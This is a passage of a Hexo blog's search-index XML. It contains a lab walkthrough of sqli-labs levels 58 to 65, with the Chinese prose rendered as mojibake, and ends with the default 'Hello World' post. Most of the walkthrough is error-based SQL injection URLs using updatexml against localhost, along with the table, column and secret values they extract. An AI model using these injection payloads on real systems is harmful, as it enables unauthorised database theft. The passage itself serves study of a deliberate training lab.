class="string">GET DATA</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-58/?id=-1&#x27;</span> union select <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables where table_schema=database()%<span class="number">23</span>    å‘ç°ä¸è¡Œï¼Œè¿”å›å€¼ä¸å¯¹</span><br><span class="line"></span><br><span class="line">å°è¯•æŠ¥é”™</span><br><span class="line">GET DATA</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">58</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27; </span></span><br><span class="line"><span class="string">æŠ¥é”™å›æ˜¾</span></span><br><span class="line"><span class="string">near &#x27;</span><span class="string">&#x27;-1&#x27;</span><span class="string">&#x27; LIMIT 0,1&#x27;</span> at line <span class="number">1</span>ï¼Œæ ¹æ®æˆ‘ä»¬çš„æ€»ç»“ï¼Œå»æ‰ä¸¤è¾¹çš„å•å¼•å·ï¼Œå»æ‰æˆ‘ä»¬åŠ çš„å•å¼•å·ï¼Œå³åŸå§‹æ•°æ® å³ <span class="string">&#x27;-1&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span> ï¼Œå¾—åˆ°åç«¯åŠ äº†å•å¼•å·</span><br><span class="line">å› ä¸ºæœ‰æŠ¥é”™ï¼Œæ‰€ä»¥ä½¿ç”¨æŠ¥é”™æ³¨å…¥</span><br><span class="line"></span><br><span class="line">GET DATA</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">58</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27; or  updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) or &#x27;</span></span><br><span class="line">å›æ˜¾</span><br><span class="line">XPATH syntax error: <span class="string">&#x27;~x6crc9emn7~&#x27;</span></span><br><span class="line"></span><br><span class="line">çˆ†å­—æ®µ</span><br><span class="line">GET DATA</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">58</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27; or  updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>x6crc9emn7<span class="string">&#x27;),0x7e),1) or &#x27;</span></span><br><span class="line">å›æ˜¾</span><br><span class="line">XPATH syntax error: <span class="string">&#x27;~id,sessid,secret_RCKC,tryy~&#x27;</span></span><br><span class="line"></span><br><span class="line">çˆ†å€¼</span><br><span class="line">GET DATA</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">58</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27; or  updatexml(1,concat(0x7e,(select secret_RCKC FROM x6crc9emn7 ),0x7e),1) or &#x27;</span></span><br><span class="line">å›æ˜¾</span><br><span class="line">XPATH syntax error: <span class="string">&#x27;~muBRf6S2lwVs3z2I0NG9Zeul~&#x27;</span></span><br><span class="line">æäº¤æˆåŠŸ</span><br></pre></td></tr></table></figure><h3 id="level-60"><a href="#level-60" class="headerlink" title="level-60"></a>level-60</h3><p>å¯ä»¥çœ‹åˆ°ï¼Œæœ‰æŠ¥é”™ä¼šå¾ˆå¿«ï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆä¸åŠ æ³¨é‡Šï¼Œä¸ºäº†é¿å…é”™è¿‡æŠ¥é”™<br>ä½¿ç”¨-1+å•å¼•å·</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">60</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27;å¤±è´¥</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-60/?id=-1&quot; æŠ¥é”™</span></span><br><span class="line"><span class="string">å›æ˜¾</span></span><br><span class="line"><span class="string">near &#x27;</span><span class="string">&quot;-1&quot;</span><span class="string">&quot;) LIMIT 0,1&#x27; at line 1ï¼Œæ ¹æ®å…¬å¼ å»æ‰ä¸¤è¾¹å•å¼•å·ï¼Œå»æ‰æˆ‘ä»¬åŠ çš„åŒå¼•å·ï¼Œå¾—  &quot;</span>-<span class="number">1</span><span class="string">&quot;) LIMIT 0,1 ï¼Œåç«¯åŠ äº†åŒå¼•å· å°æ‹¬å·</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">æŠ¥é”™æ³¨å…¥</span></span><br><span class="line"><span class="string">çˆ†è¡¨</span></span><br><span class="line"><span class="string">GET DATA</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-60/?id=-1&quot;</span> <span class="keyword">or</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select group_concat(table_name) <span class="keyword">from</span> information_schema.tables where table_schema=database()),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="keyword">or</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">å›æ˜¾</span></span><br><span class="line"><span class="string">XPATH syntax error: &#x27;~3ureov2qfe~&#x27;</span></span><br><span class="line"><span class="string">çˆ†å­—æ®µ</span></span><br><span class="line"><span class="string">GET DATA</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-60/?id=-1&quot;</span> <span class="keyword">or</span>  updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select group_concat(column_name) <span class="keyword">from</span> information_schema.columns where table_name=<span class="string">&#x27;3ureov2qfe&#x27;</span>),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="keyword">or</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">çˆ†å€¼</span></span><br><span class="line"><span class="string">GET DATA</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-60/?id=-1&quot;</span> <span class="keyword">or</span>  updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select secret_7ULB <span class="keyword">from</span> 3ureov2qfe),<span class="number">0x7e</span>),<span class="number">1</span>) <span class="keyword">or</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">å›æ˜¾</span></span><br><span class="line"><span class="string">XPATH syntax error: &#x27;~3AipH2Izlxv4x1osqnglsOka~&#x27;    </span></span><br><span class="line"><span class="string">æäº¤æˆåŠŸ</span></span><br></pre></td></tr></table></figure><h3 id="level-61"><a href="#level-61" class="headerlink" title="level-61"></a>level-61</h3><p>å•å¼•å· -1 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">61</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27; æŠ¥é”™</span></span><br><span class="line"><span class="string">use near &#x27;</span><span class="string">&#x27;-1&#x27;</span><span class="string">&#x27;)) LIMIT 0,1&#x27;</span> at line <span class="number">1</span>ï¼Œæ ¹æ®å…¬å¼ï¼Œå»é™¤é¦–ä½å•å¼•å·ï¼Œä»¥åŠæˆ‘ä»¬åŠ çš„å•å¼•å·ï¼Œå¾— <span class="string">&#x27;-1&#x27;</span>)) LIMIT <span class="number">0</span>,<span class="number">1</span>ï¼Œä¸¤ä¸ªæ‹¬å·ï¼Œç¦»è°±ã€‚ã€‚ã€‚</span><br><span class="line"></span><br><span class="line">çˆ†è¡¨</span><br><span class="line">GET DATA</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">61</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27;)) or  updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)  or ((&#x27;</span> </span><br><span class="line">å›æ˜¾</span><br><span class="line">XPATH syntax error: <span class="string">&#x27;~68tg9myn2b~&#x27;</span></span><br><span class="line"></span><br><span class="line">çˆ†å­—æ®µ</span><br><span class="line">GET DATA</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">61</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27;)) or  updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>68tg9myn2<span class="string">b&#x27;),0x7e),1)  or ((&#x27;</span> </span><br><span class="line">å›æ˜¾</span><br><span class="line">XPATH syntax error: <span class="string">&#x27;~id,sessid,secret_I5F8,tryy~&#x27;</span></span><br><span class="line"></span><br><span class="line">çˆ†å€¼</span><br><span class="line">GET DATA</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">61</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27;)) or  updatexml(1,concat(0x7e,(select secret_I5F8 from 68tg9myn2b),0x7e),1)  or ((&#x27;</span> </span><br><span class="line">å›æ˜¾</span><br><span class="line">XPATH syntax error: <span class="string">&#x27;~0bZkkQZ3DEeXUFe8BBwKNFK4~&#x27;</span></span><br><span class="line">æäº¤æˆåŠŸ</span><br></pre></td></tr></table></figure><h3 id="level-62"><a href="#level-62" class="headerlink" title="level-62"></a>level-62</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">62</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27;) or 1%23 æˆåŠŸ</span></span><br></pre></td></tr></table></figure><p>çº¯å¸ƒå°”ç›²æ³¨ï¼Œexpå¾…è¡¥<br>å‚è€ƒä»£ç ï¼š<br><a href="https://poet.gitbook.io/sqli-labs/writeup-1/lesson-62">Lesson-62</a></p><h3 id="level-63"><a href="#level-63" class="headerlink" title="level-63"></a>level-63</h3><p>åŒlevel-62ï¼Œæ¢ä¸ªæ‹¼æ¥</p><h3 id="level-64"><a href="#level-64" class="headerlink" title="level-64"></a>level-64</h3><p>åŒlevel-62ï¼Œæ¢ä¸ªæ‹¼æ¥</p><h3 id="level-65"><a href="#level-65" class="headerlink" title="level-65"></a>level-65</h3><p>åŒlevel-62ï¼Œæ¢ä¸ªæ‹¼æ¥</p><h3 id><a href="#" class="headerlink" title></a></h3>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2022/02/17/hello-world/"/>
      <url>/2022/02/17/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
